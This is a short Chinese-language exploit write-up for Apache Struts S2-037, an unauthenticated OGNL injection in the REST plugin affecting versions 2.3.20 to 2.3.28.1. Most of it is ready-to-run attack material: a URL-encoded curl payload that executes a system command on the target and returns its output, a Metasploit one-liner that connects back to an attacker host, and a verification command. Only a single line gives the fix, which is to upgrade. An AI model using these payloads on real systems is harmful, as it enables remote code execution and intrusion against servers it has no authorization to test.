## 漏洞描述

S2-037 是对 S2-033 补丁的绕过。即使关闭了 DMI，REST 插件仍然通过 URL 路径中的方法调用存在 OGNL 注入。

## 影响版本

- Apache Struts 2.3.20 - 2.3.28.1

## 前置条件

- 无需认证
- 使用 REST 插件

## 利用步骤

1. 确认目标使用 Struts2 REST 插件
2. 在 URL 路径中注入 OGNL 表达式
3. 获取命令输出

## Payload

```bash
curl "http://target/orders/3/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())%2C%23wr%3d%23context%5B%23parameters.obj%5B0%5D%5D.getWriter()%2C%23wr.println(%23res)%2C%23wr.flush()%2C%23wr.close&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts_dmi_exec; set RHOSTS target; set TARGETURI /orders/3; set RPORT 8080; set LHOST attacker_ip; run"
```

## 验证方法

```bash
curl -s "http://target/orders/3/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23res%3d%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())%2C%23wr%3d%23context%5B%23parameters.obj%5B0%5D%5D.getWriter()%2C%23wr.println(%23res)%2C%23wr.flush()%2C%23wr.close&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" | grep "uid="
```

## 修复建议

- 升级至 Struts 2.3.29+ 或 2.5+
